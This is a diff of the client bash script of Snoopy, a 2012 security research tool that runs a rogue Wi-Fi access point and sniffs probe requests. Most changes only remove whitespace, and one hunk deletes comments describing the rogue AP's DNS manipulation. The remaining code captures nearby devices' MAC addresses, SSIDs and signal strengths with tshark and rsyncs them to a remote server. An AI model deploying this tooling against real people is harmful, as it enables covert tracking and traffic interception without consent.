@@ -1,38 +1,7 @@
 #!/bin/bash
-# glenn@sensepost.com 
+# glenn@sensepost.com
 # Snoopy // 2012
 # By using this code you agree to abide by the supplied LICENSE.txt
-
-# This is the Snoopy client side script. It handles launching of the two main components:
-# 1. The Rogue Access Point
-# 2. The probe sniffer
-
-############### Snoopy rogue access point component
-# The rogue AP does the following:
-# 1. Brings up a VPN connection to our Snoopy server
-# 2. Loads injection drivers
-# 3. Brings up a [promiscuous] rogue access point
-# 4. Starts a DHCP server
-
-# Notes: 
-# a. DHCP is handled locally, but the DNS is set to the Snoopy server
-#    This allows us to do 'bad things' with DNS at a cenrtal point.
-# b. The DHCP lease file is uploaded, and inserted into the Snoopy server
-# c. OpenVPN can operate in tunnel mode (layer3) or bridged mode (layer2)
-#    Bridged mode could be used to put all drones on the same subnet, we'd
-#    then be able to capture layer2 traffic on the Snoopy server.
-#    However, in tests, this proved to be too much data over 3G.
-
-# TODO: -Get dhcp_relay working on the N900 such that we can run a
-# the DHCP daemon service on the Snoopy server.
-#       -Add more security to the rsync process.
-#       -Add watchdog to ensure everything is running properly
-
-############### Snoopy Probe Sniffer component
-# The probe sniffer component does the following:
-# 1. Enables monitor mode on the interface
-# 2. Captures probe requets, and log them to file
-# 3. Rsync uploads this data every N seconds, where it is popuated into our database
 
 # TODO:
 # Input validation! APs with a CSV metadata may break things. Convert SSID to Hex maybe?
@@ -43,7 +12,7 @@ cd $snoopyDir
 source $snoopyDir/configs/config
 save_path=$snoopyDir/snoopy_data/$device_id
 
-## samnco: bad hack to make sure there is no udhcpd 
+## samnco: bad hack to make sure there is no udhcpd
 killall -9 udhcpd
 
 #Procs for probesniff
@@ -62,12 +31,12 @@ function rogue_sniff_hdr {
 clear
 echo -e "
 +----------------------------------------------------------+
- 	Snoopy Rogue Access Point and Probe Sniffer 
+ 	Snoopy Rogue Access Point and Probe Sniffer
  +Interface: $iface
  +SSID: $ssid ($mode)
- +DeviceID: $device_id                                                            
- +VPN tunnel/sync server: $sync_server                                             
- +Date: `date`                                                                    
+ +DeviceID: $device_id
+ +VPN tunnel/sync server: $sync_server
+ +Date: `date`
 +----------------------------------------------------------+
 "
 check_tubes
@@ -80,12 +49,12 @@ if [ "$promisc" != "true" ]; then mode="Non-promiscuous"; fi
 
 echo -e "
 +----------------------------------------------------------+
- 		Snoopy Rogue Access Point. 
+ 		Snoopy Rogue Access Point.
  +Interface: $iface
  +SSID: $ssid ($mode)
- +DeviceID: $device_id                                                            
- +VPN tunnel server: $sync_server                    
- +Date: `date`                                                                    
+ +DeviceID: $device_id
+ +VPN tunnel server: $sync_server
+ +Date: `date`
 +----------------------------------------------------------+
 "
 check_tubes
@@ -97,8 +66,8 @@ echo -e "
 +----------------------------------------------------------+
  		Snoopy Probe Sniffer.
  +DeviceID: $device_id
- +SyncServer: $sync_server                          
- +Date: `date`                                                                    
+ +SyncServer: $sync_server
+ +Date: `date`
 +----------------------------------------------------------+
 "
 echo "[+] Checking Drone's internet connectivity..."
@@ -135,7 +104,7 @@ function run_probe_sniffer {
 	do
         	echo "[*] Starting probe sniffer..."
         	if [[ "$arch" == "n900" ]]; then n900_sniff; elif [[ "$arch" == "linux" ]]; then linux_sniff; fi
-		
+
         	while  kill -0 $t_pid &> /dev/null; do sleep 3; done
 	done &
 
@@ -158,7 +127,7 @@ if [[ "$arch" == "n900" ]]; then
                 tshark -b filesize:512 -b files:1 -w ~/.tmp/probes -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |/usr/bin/gnu/sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
 
         elif [[ "$arch" == "linux" ]]; then
-		
+
                 tshark -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
         fi
         t_pid=$!
@@ -209,7 +178,7 @@ if [ "$arch" == "n900" ]; then
         echo "[+] Tailing rogue AP logs in new window.."
         /usr/bin/osso-xterm -e "tail -f $save_path/rogueap.log" &
 else
-        echo "[+] Associated client logs can be seen via 'tail -f $save_path/rogueap.log'"       
+        echo "[+] Associated client logs can be seen via 'tail -f $save_path/rogueap.log'"
 fi
 
 until ifconfig -a| grep -q "at0"; do sleep 1; done
@@ -260,7 +229,7 @@ function kill_all {
 
 	# Probe sniff
 	kill $t_pid &> /dev/null
-	kill $g_pid &> /dev/null 
+	kill $g_pid &> /dev/null
 
 	#Sync
 	kill $s_pid &> /dev/null
@@ -347,7 +316,7 @@ function enable_monitor_mode {
 
         if ! iwconfig $iface |grep -q Monitor
         then
-              echo [E] Unable to enter monitor mode 
+              echo [E] Unable to enter monitor mode
               sleep 2
         fi
 }
@@ -363,7 +332,7 @@ function disable_monitor_mode {
         fi
         if iwconfig $iface |grep -q Monitor
         then
-              echo [E] Unable to exit monitor mode 
+              echo [E] Unable to exit monitor mode
               sleep 2
         fi
 
@@ -429,14 +398,14 @@ function unload_n900 {
 # End wireless drivers functions
 ###########################################
 
-# Rsync	
+# Rsync
 function sync {
 	key=$snoopyDir/configs/ssh/id_rsa
 
 	# Remove empty listing from probe_data.txt
 	sed -i '/\,\,/d' $snoopyDir/snoopy_data/probe_data.txt
 	sed -i '/\\x0/d' $snoopyDir/snoopy_data/probe_data.txt
-	
+
 	# Backgrounded
 	# Will including $snoopyDir variable disable ability to specify absolute commands restricting rsync?
 	while [ -r /tmp/snoopy_go ]; do rsync -e "ssh -i $key -o StrictHostKeyChecking=no" -rzt $snoopyDir/snoopy_data/ $sync_user@$sync_server:$upload_path &> /dev/null; sleep $delay_between_syncs; done &
@@ -461,7 +430,7 @@ function run_stuff {
                 start_rogue_ap
 		run_probe_sniffer
 		gps_logger
-		
+
 	elif [ "$probe" -eq "1" ]; then
 		run_probe_sniffer_hdr
 		monitor_mode_on
@@ -517,18 +486,18 @@ Option: "
 #        fi
 
 	read -n 1 input
-        echo ""                 
+        echo ""
 
         if [ "$input" == "1" ]; then
 		probe=1
 		rogue=0
 		run_stuff
-		
+
 	elif [ "$input" == "2" ]; then
 		probe=0
 		rogue=1
 		run_stuff
-	
+
 	elif [ "$input" == 3 ]; then
 		probe=1
 		rogue=1
@@ -567,7 +536,7 @@ Option: "
         '
 		sleep 1
         fi
-	
+
 	#main_menu
 
 }
@@ -586,20 +555,20 @@ function config_wifi {
 	#echo $ifs
 	echo -n "Option: "
 	read input
-	
+
 	if [[ "$ifs" != *$input* ]]
-	then   
+	then
 	        echo "[!] You gave me a non-existent interface! I even gave you the options to choose from :(";
 		config_wifi
 	fi
 
-	sed -i "s/^iface=.*/iface=$input/" $snoopyDir/configs/config	
+	sed -i "s/^iface=.*/iface=$input/" $snoopyDir/configs/config
 
 }
 
 function config_menu {
 	source $snoopyDir/configs/config
-	if [ "$promisc" != "true" ]; then 
+	if [ "$promisc" != "true" ]; then
 		mode="Non-promiscuous"
 	else
 		mode="Promiscuous"
@@ -635,8 +604,8 @@ Option: "
 	read -n 1 input
 	#echo $?
 
-	echo ""                 
-	
+	echo ""
+
 	if [ "$input" == "1" ]; then
 	        config_wifi
 	elif [ "$input" == "2" ]; then
@@ -658,7 +627,7 @@ Option: "
 	elif [[ "$input" == "x" || "$input" == "X" ]]; then
 		conf_end=1
 		return
-	else   
+	else
         echo '
                .-~~~~-.
               / __     \
